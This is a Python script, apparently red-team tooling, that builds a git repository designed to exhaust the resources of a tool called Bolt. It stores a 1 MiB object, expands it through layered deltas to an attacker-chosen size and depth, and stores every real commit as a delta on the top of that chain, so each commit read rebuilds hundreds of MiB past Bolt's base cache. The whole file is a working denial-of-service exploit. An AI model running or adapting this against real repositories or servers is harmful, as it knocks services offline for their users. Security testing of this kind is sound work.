"""Builds a delta-amplification repository. One "commit" of 1 MiB of zeros is stored whole; a
delta on it builds <MiB> MiB (each a copy of that MiB), and <depth>-1 more deltas each rebuild
that size again. Then a chain of <N> small real commits, each a delta on the top of that chain.
Nothing references the big objects. Bolt's base cache (256 MiB) can't hold a base that big, so
every read of every commit rebuilds the whole chain: <depth> copies of <MiB> MiB.
Usage: python3 -I amplify.py <dir> <N> <MiB> [depth]"""
import struct
import sys

sys.path.insert(0, "/work/redteam/attacks3")
from gitrepo import Repo, PackWriter, oid, commit_bytes, copy_op, insert_ops, varint

root, n, mib = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
depth = int(sys.argv[4]) if len(sys.argv) > 4 else 1
size = mib << 20
repo = Repo(root)
pack = PackWriter(repo, 1 + depth + 1 + n)
# Only the commits are ever looked up by ID; the big objects get made-up ones.
fake = lambda k: bytes([0xFE]) + struct.pack(">Q", k) + bytes(11)
at = pack.whole(b"commit", bytes(1 << 20), fake(0))
delta = varint(1 << 20) + varint(size) + copy_op(0, 1 << 20) * mib
at = pack.ofs_delta(at, delta, fake(1))
for level in range(2, depth + 1):
    # All but the last 8 bytes copied, then 8 of its own: each level is another object.
    delta = varint(size) + varint(size)
    done = 0
    while done < size - 8:
        step = min(0xFF0000, size - 8 - done)
        delta += copy_op(done, step)
        done += step
    at = pack.ofs_delta(at, delta + insert_ops(struct.pack(">Q", level)), fake(level))
tree = oid(b"tree", b"")
pack.whole(b"tree", b"", tree)
tip = None
for i in range(n):
    data = commit_bytes(tree, [tip] if tip else [], b"commit %d\n" % i)
    tip = oid(b"commit", data)
    pack.ofs_delta(at, varint(size) + varint(len(data)) + insert_ops(data), tip)
pack.finish()
repo.ref("refs/heads/main", tip)
